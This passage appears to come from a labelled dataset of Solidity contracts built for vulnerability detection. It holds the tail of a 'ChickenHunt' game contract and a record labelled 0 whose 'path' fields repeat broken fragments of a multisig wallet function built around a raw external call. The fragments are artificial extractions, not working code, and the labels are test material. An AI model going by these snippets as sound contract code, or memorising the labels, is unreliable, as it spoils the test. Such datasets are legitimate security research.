Config public typeB; function upgradeStrength(uint256 _to) external payable { House storage _house = _houseOf(msg.sender); uint256 _from = _house.hunter.strength; require(typeA.max >= _to && _to > _from); _payForUpgrade(_from, _to, typeA); uint256 _increment = _house.hunter.dexterity.mul(2).add(8).mul(_to.square() - _from ** 2); _house.hunter.strength = _to; _house.huntingPower = _house.huntingPower.add(_increment); _house.offensePower = _house.offensePower.add(_increment); emit UpgradeHunter(msg.sender, \"strength\", _to); } function upgradeDexterity(uint256 _to) external payable { House storage _house = _houseOf(msg.sender); uint256 _from = _house.hunter.dexterity; require(typeB.max >= _to && _to > _from); _payForUpgrade(_from, _to, typeB); uint256 _increment = _house.hunter.strength.square().mul((_to - _from).mul(2)); _house.hunter.dexterity = _to; _house.huntingPower = _house.huntingPower.add(_increment); _house.offensePower = _house.offensePower.add(_increment); emit UpgradeHunter(msg.sender, \"dexterity\", _to); } function upgradeConstitution(uint256 _to) external payable { House storage _house = _houseOf(msg.sender); uint256 _from = _house.hunter.constitution; require(typeA.max >= _to && _to > _from); _payForUpgrade(_from, _to, typeA); uint256 _increment = _house.hunter.resistance.mul(2).add(8).mul(_to.square() - _from ** 2); _house.hunter.constitution = _to; _house.defensePower = _house.defensePower.add(_increment); emit UpgradeHunter(msg.sender, \"constitution\", _to); } function upgradeResistance(uint256 _to) external payable { House storage _house = _houseOf(msg.sender); uint256 _from = _house.hunter.resistance; require(typeB.max >= _to && _to > _from); _payForUpgrade(_from, _to, typeB); uint256 _increment = _house.hunter.constitution.square().mul((_to - _from).mul(2)); _house.hunter.resistance = _to; _house.defensePower = _house.defensePower.add(_increment); emit UpgradeHunter(msg.sender, \"resistance\", _to); } function _payForUpgrade(uint256 _from, uint256 _to, Config _type) internal { uint256 _chickenCost = _type.chicken.mul(_gapOfCubeSum(_from, _to)); _payChicken(msg.sender, _chickenCost); uint256 _ethereumCost = _type.ethereum.mul(_gapOfSquareSum(_from, _to)); _payEthereumAndDistribute(_ethereumCost); } function _gapOfSquareSum(uint256 _before, uint256 _after) internal pure returns (uint256) { return (_after * (_after - 1) * (2 * _after - 1) - _before * (_before - 1) * (2 * _before - 1)) / 6; } function _gapOfCubeSum(uint256 _before, uint256 _after) internal pure returns (uint256) { return ((_after * (_after - 1)) ** 2 - (_before * (_before - 1)) ** 2) >> 2; } } contract CHHouse is CHHunter { event UpgradePet( address indexed user, uint256 id, uint256 to ); event UpgradeDepot( address indexed user, uint256 to ); event BuyItem( address indexed from, address indexed to, uint256 indexed id, uint256 cost ); event BuyStore( address indexed from, address indexed to, uint256 cost ); struct Pet { uint256 huntingPower; uint256 offensePower; uint256 defensePower; uint256 chicken; uint256 ethereum; uint256 max; } struct Item { address owner; uint256 huntingMultiplier; uint256 offenseMultiplier; uint256 defenseMultiplier; uint256 cost; } struct Depot { uint256 ethereum; uint256 max; } uint256 public constant INCREMENT_RATE = 12; Depot public depot; Pet[] public pets; Item[] public items; function buyDepots(uint256 _amount) external payable { House storage _house = _houseOf(msg.sender); _house.depots = _house.depots.add(_amount); require(_house.depots <= depot.max); _payEthereumAndDistribute(_amount.mul(depot.ethereum)); emit UpgradeDepot(msg.sender, _house.depots); } function buyPets(uint256 _id, uint256 _amount) external payable { require(_id < pets.length); Pet memory _pet = pets[_id]; uint256 _chickenCost = _amount * _pet.chicken; _payChicken(msg.sender, _chickenCost); uint256 _ethereumCost = _amount * _pet.ethereum; _payEthereumAndDistribute(_ethereumCost); House storage _house = _houseOf(msg.sender); if (_house.pets.length < _id + 1) { _house.pets.length = _id + 1; } _house.pets[_id] = _house.pets[_id].add(_amount); require(_house.pets[_id] <= _pet.max); _house.huntingPower = _house.huntingPower.add(_pet.huntingPower * _amount); _house.offensePower = _house.offensePower.add(_pet.offensePower * _amount); _house.defensePower = _house.defensePower.add(_pet.defensePower * _amount); emit UpgradePet(msg.sender, _id, _house.pets[_id]); } function buyItem(uint256 _id) external payable { Item storage _item = items[_id]; address _from = _item.owner; uint256 _price = _item.cost.mul(INCREMENT_RATE) / 10; _payEthereum(_price); saveChickenOf(_from); House storage _fromHouse = _houseOf(_from); _fromHouse.huntingMultiplier = _fromHouse.huntingMultiplier.sub(_item.huntingMultiplier); _fromHouse.offenseMultiplier = _fromHouse.offenseMultiplier.sub(_item.offenseMultiplier); _fromHouse.defenseMultiplier = _fromHouse.defenseMultiplier.sub(_item.defenseMultiplier); saveChickenOf(msg.sender); House storage _toHouse = _houseOf(msg.sender); _toHouse.huntingMultiplier = _toHouse.huntingMultiplier.add(_item.huntingMultiplier); _toHouse.offenseMultiplier = _toHouse.offenseMultiplier.add(_item.offenseMultiplier); _toHouse.defenseMultiplier = _toHouse.defenseMultiplier.add(_item.defenseMultiplier); uint256 _halfMargin = _price.sub(_item.cost) / 2; devFee = devFee.add(_halfMargin); ethereumBalance[_from] = ethereumBalance[_from].add(_price - _halfMargin); items[_id].cost = _price; items[_id].owner = msg.sender; emit BuyItem(_from, msg.sender, _id, _price); } function buyStore() external payable { address _from = store.owner; uint256 _price = store.cost.mul(INCREMENT_RATE) / 10; _payEthereum(_price); uint256 _halfMargin = (_price - store.cost) / 2; devFee = devFee.add(_halfMargin); ethereumBalance[_from] = ethereumBalance[_from].add(_price - _halfMargin).add(store.balance); store.cost = _price; store.owner = msg.sender; delete store.balance; emit BuyStore(_from, msg.sender, _price); } function withdrawStoreBalance() public { ethereumBalance[store.owner] = ethereumBalance[store.owner].add(store.balance); delete store.balance; } } contract CHArena is CHHouse { event Attack( address indexed attacker, address indexed defender, uint256 booty ); mapping(address => uint256) public attackCooldown; uint256 public cooldownTime; function attack(address _target) external { require(attackCooldown[msg.sender] < block.timestamp); House storage _attacker = houses[msg.sender]; House storage _defender = houses[_target]; if (_attacker.offensePower.mul(_attacker.offenseMultiplier) > _defender.defensePower.mul(_defender.defenseMultiplier)) { uint256 _chicken = saveChickenOf(_target); _chicken = _defender.depots > 0 ? _chicken / _defender.depots : _chicken; savedChickenOf[_target] = savedChickenOf[_target] - _chicken; savedChickenOf[msg.sender] = savedChickenOf[msg.sender].add(_chicken); attackCooldown[msg.sender] = block.timestamp + cooldownTime; emit Attack(msg.sender, _target, _chicken); } } } contract CHAltar is CHArena { event NewAltarRecord(uint256 id, uint256 ethereum); event ChickenToAltar(address indexed user, uint256 id, uint256 chicken); event EthereumFromAltar(address indexed user, uint256 id, uint256 ethereum); struct AltarRecord { uint256 ethereum; uint256 chicken; } struct TradeBook { uint256 altarRecordId; uint256 chicken; } uint256 public genesis; mapping (uint256 => AltarRecord) public altarRecords; mapping (address => TradeBook) public tradeBooks; function chickenToAltar(uint256 _chicken) external { require(_chicken > 0); _payChicken(msg.sender, _chicken); uint256 _id = _getCurrentAltarRecordId(); AltarRecord storage _altarRecord = _getAltarRecord(_id); require(_altarRecord.ethereum * _chicken / _chicken == _altarRecord.ethereum); TradeBook storage _tradeBook = tradeBooks[msg.sender]; if (_tradeBook.altarRecordId < _id) { _resolveTradeBook(_tradeBook); _tradeBook.altarRecordId = _id; } _altarRecord.chicken = _altarRecord.chicken.add(_chicken); _tradeBook.chicken += _chicken; emit ChickenToAltar(msg.sender, _id, _chicken); } function ethereumFromAltar() external { uint256 _id = _getCurrentAltarRecordId(); TradeBook storage _tradeBook = tradeBooks[msg.sender]; require(_tradeBook.altarRecordId < _id); _resolveTradeBook(_tradeBook); } function tradeBookOf(address _user) public view returns ( uint256 _id, uint256 _ethereum, uint256 _totalChicken, uint256 _chicken, uint256 _income ) { TradeBook memory _tradeBook = tradeBooks[_user]; _id = _tradeBook.altarRecordId; _chicken = _tradeBook.chicken; AltarRecord memory _altarRecord = altarRecords[_id]; _totalChicken = _altarRecord.chicken; _ethereum = _altarRecord.ethereum; _income = _totalChicken > 0 ? _ethereum.mul(_chicken) / _totalChicken : 0; } function _resolveTradeBook(TradeBook storage _tradeBook) internal { if (_tradeBook.chicken > 0) { AltarRecord memory _oldAltarRecord = altarRecords[_tradeBook.altarRecordId]; uint256 _ethereum = _oldAltarRecord.ethereum.mul(_tradeBook.chicken) / _oldAltarRecord.chicken; delete _tradeBook.chicken; ethereumBalance[msg.sender] = ethereumBalance[msg.sender].add(_ethereum); emit EthereumFromAltar(msg.sender, _tradeBook.altarRecordId, _ethereum); } } function _getCurrentAltarRecordId() internal view returns (uint256) { return (block.timestamp - genesis) / 86400; } function _getAltarRecord(uint256 _id) internal returns (AltarRecord storage _altarRecord) { _altarRecord = altarRecords[_id]; if (_altarRecord.ethereum == 0) { uint256 _ethereum = altarFund / 10; _altarRecord.ethereum = _ethereum; altarFund -= _ethereum; emit NewAltarRecord(_id, _ethereum); } } } contract CHCommittee is CHAltar { event NewPet( uint256 id, uint256 huntingPower, uint256 offensePower, uint256 defense, uint256 chicken, uint256 ethereum, uint256 max ); event ChangePet( uint256 id, uint256 chicken, uint256 ethereum, uint256 max ); event NewItem( uint256 id, uint256 huntingMultiplier, uint256 offenseMultiplier, uint256 defenseMultiplier, uint256 ethereum ); event SetDepot(uint256 ethereum, uint256 max); event SetConfiguration( uint256 chickenA, uint256 ethereumA, uint256 maxA, uint256 chickenB, uint256 ethereumB, uint256 maxB ); event SetDistribution( uint256 dividendRate, uint256 altarCut, uint256 storeCut, uint256 devCut ); event SetCooldownTime(uint256 cooldownTime); event SetNameAndSymbol(string name, string symbol); event SetDeveloper(address developer); event SetCommittee(address committee); address public committee; address public developer; function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyCommittee returns (bool) { return _to.call.value(_value).gas(_gas)(_code); } function addPet( uint256 _huntingPower, uint256 _offensePower, uint256 _defense, uint256 _chicken, uint256 _ethereum, uint256 _max ) public onlyCommittee { require(_max > 0); require(_max == uint256(uint32(_max))); uint256 _newLength = pets.push( Pet(_huntingPower, _offensePower, _defense, _chicken, _ethereum, _max) ); emit NewPet( _newLength - 1, _huntingPower, _offensePower, _defense, _chicken, _ethereum, _max ); } function changePet( uint256 _id, uint256 _chicken, uint256 _ethereum, uint256 _max ) public onlyCommittee { require(_id < pets.length); Pet storage _pet = pets[_id]; require(_max >= _pet.max && _max == uint256(uint32(_max))); _pet.chicken = _chicken; _pet.ethereum = _ethereum; _pet.max = _max; emit ChangePet(_id, _chicken, _ethereum, _max); } function addItem( uint256 _huntingMultiplier, uint256 _offenseMultiplier, uint256 _defenseMultiplier, uint256 _price ) public onlyCommittee { uint256 _cap = 1 << 16; require( _huntingMultiplier < _cap && _offenseMultiplier < _cap && _defenseMultiplier < _cap ); saveChickenOf(committee); House storage _house = _houseOf(committee); _house.huntingMultiplier = _house.huntingMultiplier.add(_huntingMultiplier); _house.offenseMultiplier = _house.offenseMultiplier.add(_offenseMultiplier); _house.defenseMultiplier = _house.defenseMultiplier.add(_defenseMultiplier); uint256 _newLength = items.push( Item( committee, _huntingMultiplier, _offenseMultiplier, _defenseMultiplier, _price ) ); emit NewItem( _newLength - 1, _huntingMultiplier, _offenseMultiplier, _defenseMultiplier, _price ); } function setDepot(uint256 _price, uint256 _max) public onlyCommittee { require(_max >= depot.max); depot.ethereum = _price; depot.max = _max; emit SetDepot(_price, _max); } function setConfiguration( uint256 _chickenA, uint256 _ethereumA, uint256 _maxA, uint256 _chickenB, uint256 _ethereumB, uint256 _maxB ) public onlyCommittee { require(_maxA >= typeA.max && (_maxA == uint256(uint32(_maxA)))); require(_maxB >= typeB.max && (_maxB == uint256(uint32(_maxB)))); typeA.chicken = _chickenA; typeA.ethereum = _ethereumA; typeA.max = _maxA; typeB.chicken = _chickenB; typeB.ethereum = _ethereumB; typeB.max = _maxB; emit SetConfiguration(_chickenA, _ethereumA, _maxA, _chickenB, _ethereumB, _maxB); } function setDistribution( uint256 _dividendRate, uint256 _altarCut, uint256 _storeCut, uint256 _devCut ) public onlyCommittee { require(_storeCut > 0); require( _dividendRate.add(_altarCut).add(_storeCut).add(_devCut) == 100 ); dividendRate = _dividendRate; altarCut = _altarCut; store.cut = _storeCut; devCut = _devCut; emit SetDistribution(_dividendRate, _altarCut, _storeCut, _devCut); } function setCooldownTime(uint256 _cooldownTime) public onlyCommittee { cooldownTime = _cooldownTime; emit SetCooldownTime(_cooldownTime); } function setNameAndSymbol(string _name, string _symbol) public onlyCommittee { name = _name; symbol = _symbol; emit SetNameAndSymbol(_name, _symbol); } function setDeveloper(address _developer) public onlyCommittee { require(_developer != address(0)); withdrawDevFee(); developer = _developer; emit SetDeveloper(_developer); } function setCommittee(address _committee) public onlyCommittee { require(_committee != address(0)); committee = _committee; emit SetCommittee(_committee); } function withdrawDevFee() public { ethereumBalance[developer] = ethereumBalance[developer].add(devFee); delete devFee; } modifier onlyCommittee { require(msg.sender == committee); _; } } contract ChickenHunt is CHCommittee { event Join(address user); constructor() public { committee = msg.sender; developer = msg.sender; } function init(address _chickenTokenDelegator) external onlyCommittee { require(chickenTokenDelegator == address(0)); chickenTokenDelegator = _chickenTokenDelegator; genesis = 1525791600; join(); store.owner = msg.sender; store.cost = 0.1 ether; setConfiguration(100, 0.00001 ether, 99, 100000, 0.001 ether, 9); setDistribution(20, 75, 1, 4); setCooldownTime(600); setDepot(0.05 ether, 9); addItem(5, 5, 0, 0.01 ether); addItem(0, 0, 5, 0.01 ether); addPet(1000, 0, 0, 100000, 0.01 ether, 9); addPet(0, 1000, 0, 100000, 0.01 ether, 9); addPet(0, 0, 1000, 202500, 0.01 ether, 9); } function withdraw() external { uint256 _ethereum = ethereumBalance[msg.sender]; delete ethereumBalance[msg.sender]; msg.sender.transfer(_ethereum); } function join() public { House storage _house = houses[msg.sender]; require(_house.depots == 0); _house.hunter = Hunter(1, 1, 1, 1); _house.depots = 1; _house.huntingPower = 10; _house.offensePower = 10; _house.defensePower = 110; _house.huntingMultiplier = 10; _house.offenseMultiplier = 10; _house.defenseMultiplier = 10; lastSaveTime[msg.sender] = block.timestamp; emit Join(msg.sender); } function hunterOf(address _user) public view returns ( uint256 _strength, uint256 _dexterity, uint256 _constitution, uint256 _resistance ) { Hunter memory _hunter = houses[_user].hunter; return ( _hunter.strength, _hunter.dexterity, _hunter.constitution, _hunter.resistance ); } function detailsOf(address _user) public view returns ( uint256[2] _hunting, uint256[2] _offense, uint256[2] _defense, uint256[4] _hunter, uint256[] _pets, uint256 _depots, uint256 _savedChicken, uint256 _lastSaveTime, uint256 _cooldown ) { House memory _house = houses[_user]; _hunting = [_house.huntingPower, _house.huntingMultiplier]; _offense = [_house.offensePower, _house.offenseMultiplier]; _defense = [_house.defensePower, _house.defenseMultiplier]; _hunter = [ _house.hunter.strength, _house.hunter.dexterity, _house.hunter.constitution, _house.hunter.resistance ]; _pets = _house.pets; _depots = _house.depots; _savedChicken = savedChickenOf[_user]; _lastSaveTime = lastSaveTime[_user]; _cooldown = attackCooldown[_user]; } } "}
{"sol name": "31912.sol", "label": 0, "first path": "function serveTx(WalletData storage self,  address _to, uint256 _value,  bytes _txData,  bool _confirm,    bytes _data)  public returns (bool,bytes32)  { bytes32 _id = keccak256(\"serveTx\",_to,_value,_txData); uint256 _txIndex = self.transactionInfo[_id].length; uint256 _required = self.requiredMajor; if(msg.sender != address(this)){ bool allGood; uint256 _amount; if(!_confirm) { allGood = revokeConfirm(self, _id); return (allGood,_id); } else { if(_to != 0) (allGood,_amount) = getAmount(_txData); if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){ require(self.ownerIndex[msg.sender] > 0); _required = getRequired(self, _to, _value, allGood,_amount); self.transactionInfo[_id].length++; self.transactionInfo[_id][_txIndex].confirmRequired = _required; self.transactionInfo[_id][_txIndex].day = now / 1 days; self.transactions[now / 1 days].push(_id); } else { _txIndex--; allGood = checkNotConfirmed(self, _id, _txIndex); if(!allGood) return (false,_id); self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender)); self.transactionInfo[_id][_txIndex].confirmCount++; } else { _txIndex--; if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) { self.currentSpend[0][1] += _value; self.currentSpend[_to][1] += _amount; self.transactionInfo[_id][_txIndex].success = true; if(_to == 0){ createContract(_txData, _value); } else { require(_to.call.value(_value)(_txData)); delete self.transactionInfo[_id][_txIndex].data; LogTransactionComplete(_id, _to, _value, _data); } else { if(self.transactionInfo[_id][_txIndex].data.length == 0) self.transactionInfo[_id][_txIndex].data = _data; uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount); LogTransactionConfirmed(_id, msg.sender, confirmsNeeded); return (true,_id); ", "second path": "function serveTx(WalletData storage self,  address _to, uint256 _value,  bytes _txData,  bool _confirm,    bytes _data)  public returns (bool,bytes32)  { bytes32 _id = keccak256(\"serveTx\",_to,_value,_txData); uint256 _txIndex = self.transactionInfo[_id].length; uint256 _required = self.requiredMajor; if(msg.sender != address(this)){ bool allGood; uint256 _amount; if(!_confirm) { allGood = revokeConfirm(self, _id); return (allGood,_id); } else { if(_to != 0) (allGood,_amount) = getAmount(_txData); if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){ require(self.ownerIndex[msg.sender] > 0); _required = getRequired(self, _to, _value, allGood,_amount); self.transactionInfo[_id].length++; self.transactionInfo[_id][_txIndex].confirmRequired = _required; self.transactionInfo[_id][_txIndex].day = now / 1 days; self.transactions[now / 1 days].push(_id); } else { _txIndex--; allGood = checkNotConfirmed(self, _id, _txIndex); if(!allGood) return (false,_id); self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender)); self.transactionInfo[_id][_txIndex].confirmCount++; } else { _txIndex--; if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) { self.currentSpend[0][1] += _value; self.currentSpend[_to][1] += _amount; self.transactionInfo[_id][_txIndex].success = true; if(_to == 0){ createContract(_txData, _value); } else { require(_to.call.value(_value)(_txData)); delete self.transactionInfo[_id][_txIndex].data; LogTransactionComplete(_id, _to, _value, _data); } else { if(self.transactionInfo[_id][_txIndex].data.length == 0) self.transactionInfo[_id][_txIndex].data = _data; uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount); LogTransactionConfirmed(_id, msg.sender, confirmsNeeded); return (true,_id); ", "third path": "function serveTx(WalletData storage self,  address _to, uint256 _value,  bytes _txData,  bool _confirm,    bytes _data)  public returns (bool,bytes32)  { bytes32 _id = keccak256(\"serveTx\",_to,_value,_txData); uint256 _txIndex = self.transactionInfo[_id].length; uint256 _required = self.requiredMajor; if(msg.sender != address(this)){ bool allGood; uint256 _amount; if(!_confirm) { allGood = revokeConfirm(self, _id); return (allGood,_id); } else { if(_to != 0) (allGood,_amount) = getAmount(_txData); if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){ require(self.ownerIndex[msg.sender] > 0); _required = getRequired(self, _to, _value, allGood,_amount); self.transactionInfo[_id].length++; self.transactionInfo[_id][_txIndex].confirmRequired = _required; self.transactionInfo[_id][_txIndex].day = now / 1 days; self.transactions[now / 1 days].push(_id); } else { _txIndex--; allGood = checkNotConfirmed(self, _id, _txIndex); if(!allGood) return (false,_id); self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender)); self.transactionInfo[_id][_txIndex].confirmCount++; } else { _txIndex--; if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) { self.currentSpend[0][1] += _value; self.currentSpend[_to][1] += _amount; self.transactionInfo[_id][_txIndex].success = true; if(_to == 0){ createContract(_txData, _value); } else { require(_to.call.value(_value)(_txData)); delete self.transactionInfo[_id][_txIndex].data; LogTransactionComplete(_id, _to, _value, _data); } else { if(self.transactionInfo[_id][_txIndex].data.length == 0) self.transactionInfo[_id][_txIndex].data = _data; uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount); LogTransactionConfirmed(_id, msg.sender, confirmsNeeded); return (true,_id); ", "long path": "pragma solidity ^0.4.18; library WalletAdminLib { using WalletMainLib for WalletMainLib.WalletData; event LogTransactionConfirmed(bytes32 txid, address sender, uint256 confirmsNeeded); event LogOwnerAdded(address newOwner); event LogOwnerRemoved(address ownerRemoved); event LogOwnerChanged(address from, address to); event LogRequirementChange(uint256 newRequired); event LogThresholdChange(address token, uint256 newThreshold); event LogErrorMsg(uint256 amount, string msg); function checkChangeOwnerArgs(uint256 _from, uint256 _to) private returns (bool) { if(_from == 0){ LogErrorMsg(_from, \"Change from address is not an owner\"); return false; } if(_to != 0){ LogErrorMsg(_to, \"Change to address is an owner\"); return false; } return true; } function checkNewOwnerArgs(uint256 _index, uint256 _length, uint256 _max) private returns (bool) { if(_index != 0){ LogErrorMsg(_index, \"New owner already owner\"); return false; } if((_length + 1) > _max){ LogErrorMsg(_length, \"Too many owners\"); return false; } return true; } function checkRemoveOwnerArgs(uint256 _index, uint256 _length, uint256 _min) private returns (bool) { if(_index == 0){ LogErrorMsg(_index, \"Owner removing not an owner\"); return false; } if(_length - 2 < _min) { LogErrorMsg(_index, \"Must reduce requiredAdmin first\"); return false; } return true; } function checkRequiredChange(uint256 _newRequired, uint256 _length) private returns (bool) { if(_newRequired == 0){ LogErrorMsg(_newRequired, \"Cant reduce to 0\"); return false; } if(_length - 2 < _newRequired){ LogErrorMsg(_length, \"Making requirement too high\"); return false; } return true; } function calcConfirmsNeeded(uint256 _required, uint256 _count) private pure returns (uint256) { return _required - _count; } function changeOwner(WalletMainLib.WalletData storage self, address _from, address _to, bool _confirm, bytes _data) public returns (bool,bytes32) { bytes32 _id = keccak256(\"changeOwner\",_from,_to); uint256 _txIndex = self.transactionInfo[_id].length; bool allGood; if(msg.sender != address(this)){ if(!_confirm) { allGood = self.revokeConfirm(_id); return (allGood,_id); } else { if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){ require(self.ownerIndex[msg.sender] > 0); allGood = checkChangeOwnerArgs(self.ownerIndex[_from], self.ownerIndex[_to]); if(!allGood) return (false,0); self.transactionInfo[_id].length++; self.transactionInfo[_id][_txIndex].confirmRequired = self.requiredAdmin; self.transactionInfo[_id][_txIndex].day = now / 1 days; self.transactions[now / 1 days].push(_id); } else { _txIndex--; allGood = self.checkNotConfirmed(_id, _txIndex); if(!allGood) return (false,_id); } } self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender)); self.transactionInfo[_id][_txIndex].confirmCount++; } else { _txIndex--; } if(self.transactionInfo[_id][_txIndex].confirmCount == self.transactionInfo[_id][_txIndex].confirmRequired) { self.transactionInfo[_id][_txIndex].success = true; uint256 i = self.ownerIndex[_from]; self.ownerIndex[_from] = 0; self.owners[i] = _to; self.ownerIndex[_to] = i; delete self.transactionInfo[_id][_txIndex].data; LogOwnerChanged(_from, _to); } else { if(self.transactionInfo[_id][_txIndex].data.length == 0) self.transactionInfo[_id][_txIndex].data = _data; uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount); LogTransactionConfirmed(_id, msg.sender, confirmsNeeded); } return (true,_id); } function addOwner(WalletMainLib.WalletData storage self, address _newOwner, bool _confirm, bytes _data) public returns (bool,bytes32) { bytes32 _id = keccak256(\"addOwner\",_newOwner); uint256 _txIndex = self.transactionInfo[_id].length; bool allGood; if(msg.sender != address(this)){ require(_newOwner != 0); if(!_confirm) { allGood = self.revokeConfirm(_id); return (allGood,_id); } else { if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){ require(self.ownerIndex[msg.sender] > 0); allGood = checkNewOwnerArgs(self.ownerIndex[_newOwner], self.owners.length, self.maxOwners); if(!allGood) return (false,0); self.transactionInfo[_id].length++; self.transactionInfo[_id][_txIndex].confirmRequired = self.requiredAdmin; self.transactionInfo[_id][_txIndex].day = now / 1 days; self.transactions[now / 1 days].push(_id); } else { _txIndex--; allGood = self.checkNotConfirmed(_id, _txIndex); if(!allGood) return (false,_id); } } self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender)); self.transactionInfo[_id][_txIndex].confirmCount++; } else { _txIndex--; } if(self.transactionInfo[_id][_txIndex].confirmCount == self.transactionInfo[_id][_txIndex].confirmRequired) { self.transactionInfo[_id][_txIndex].success = true; self.owners.push(_newOwner); self.ownerIndex[_newOwner] = self.owners.length - 1; delete self.transactionInfo[_id][_txIndex].data; LogOwnerAdded(_newOwner); } else { if(self.transactionInfo[_id][_txIndex].data.length == 0) self.transactionInfo[_id][_txIndex].data = _data; uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount); LogTransactionConfirmed(_id, msg.sender, confirmsNeeded); } return (true,_id); } function removeOwner(WalletMainLib.WalletData storage self, address _ownerRemoving, bool _confirm, bytes _data) public returns (bool,bytes32) { bytes32 _id = keccak256(\"removeOwner\",_ownerRemoving); uint256 _txIndex = self.transactionInfo[_id].length; bool allGood; if(msg.sender != address(this)){ if(!_confirm) { allGood = self.revokeConfirm(_id); return (allGood,_id); } else { if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){ require(self.ownerIndex[msg.sender] > 0); allGood = checkRemoveOwnerArgs(self.ownerIndex[_ownerRemoving], self.owners.length, self.requiredAdmin); if(!allGood) return (false,0); self.transactionInfo[_id].length++; self.transactionInfo[_id][_txIndex].confirmRequired = self.requiredAdmin; self.transactionInfo[_id][_txIndex].day = now / 1 days; self.transactions[now / 1 days].push(_id); } else { _txIndex--; allGood = self.checkNotConfirmed(_id, _txIndex); if(!allGood) return (false,_id); } } self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender)); self.transactionInfo[_id][_txIndex].confirmCount++; } else { _txIndex--; } if(self.transactionInfo[_id][_txIndex].confirmCount == self.transactionInfo[_id][_txIndex].confirmRequired) { self.transactionInfo[_id][_txIndex].success = true; self.owners[self.ownerIndex[_ownerRemoving]] = self.owners[self.owners.length - 1]; self.ownerIndex[self.owners[self.owners.length - 1]] = self.ownerIndex[_ownerRemoving]; self.ownerIndex[_ownerRemoving] = 0; self.owners.length--; delete self.transactionInfo[_id][_txIndex].data; LogOwnerRemoved(_ownerRemoving); } else { if(self.transactionInfo[_id][_txIndex].data.length == 0) self.transactionInfo[_id][_txIndex].data = _data; uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount); LogTransactionConfirmed(_id, msg.sender, confirmsNeeded); } return (true,_id); } function changeRequiredAdmin(WalletMainLib.WalletData storage self, uint256 _requiredAdmin, bool _confirm, bytes _data) public returns (bool,bytes32) { bytes32 _id = keccak256(\"changeRequiredAdmin\",_requiredAdmin); uint256 _txIndex = self.transactionInfo[_id].length; if(msg.sender != address(this)){ bool allGood; if(!_confirm) { allGood = self.revokeConfirm(_id); return (allGood,_id); } else { if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){ require(self.ownerIndex[msg.sender] > 0); allGood = checkRequiredChange(_requiredAdmin, self.owners.length); if(!allGood) return (false,0); self.transactionInfo[_id].length++; self.transactionInfo[_id][_txIndex].confirmRequired = self.requiredAdmin; self.transactionInfo[_id][_txIndex].day = now / 1 days; self.transactions[now / 1 days].push(_id); } else { _txIndex--; allGood = self.checkNotConfirmed(_id, _txIndex); if(!allGood) return (false,_id); } } self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender)); self.transactionInfo[_id][_txIndex].confirmCount++; } else { _txIndex--; } if(self.transactionInfo[_id][_txIndex].confirmCount == self.transactionInfo[_id][_txIndex].confirmRequired) { self.transactionInfo[_id][_txIndex].success = true; self.requiredAdmin = _requiredAdmin; delete self.transactionInfo[_id][_txIndex].data; LogRequirementChange(_requiredAdmin); } else { if(self.transactionInfo[_id][_txIndex].data.length == 0) self.transactionInfo[_id][_txIndex].data = _data; uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount); LogTransactionConfirmed(_id, msg.sender, confirmsNeeded); } return (true,_id); } function changeRequiredMajor(WalletMainLib.WalletData storage self, uint256 _requiredMajor, bool _confirm, bytes _data) public returns (bool,bytes32) { bytes32 _id = keccak256(\"changeRequiredMajor\",_requiredMajor); uint256 _txIndex = self.transactionInfo[_id].length; if(msg.sender != address(this)){ bool allGood; if(!_confirm) { allGood = self.revokeConfirm(_id); return (allGood,_id); } else { if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){ require(self.ownerIndex[msg.sender] > 0); allGood = checkRequiredChange(_requiredMajor, self.owners.length); if(!allGood) return (false,0); self.transactionInfo[_id].length++; self.transactionInfo[_id][_txIndex].confirmRequired = self.requiredAdmin; self.transactionInfo[_id][_txIndex].day = now / 1 days; self.transactions[now / 1 days].push(_id); } else { _txIndex--; allGood = self.checkNotConfirmed(_id, _txIndex); if(!allGood) return (false,_id); } } self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender)); self.transactionInfo[_id][_txIndex].confirmCount++; } else { _txIndex--; } if(self.transactionInfo[_id][_txIndex].confirmCount == self.transactionInfo[_id][_txIndex].confirmRequired) { self.transactionInfo[_id][_txIndex].success = true; self.requiredMajor = _requiredMajor; delete self.transactionInfo[_id][_txIndex].data; LogRequirementChange(_requiredMajor); } else { if(self.transactionInfo[_id][_txIndex].data.length == 0) self.transactionInfo[_id][_txIndex].data = _data; uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, 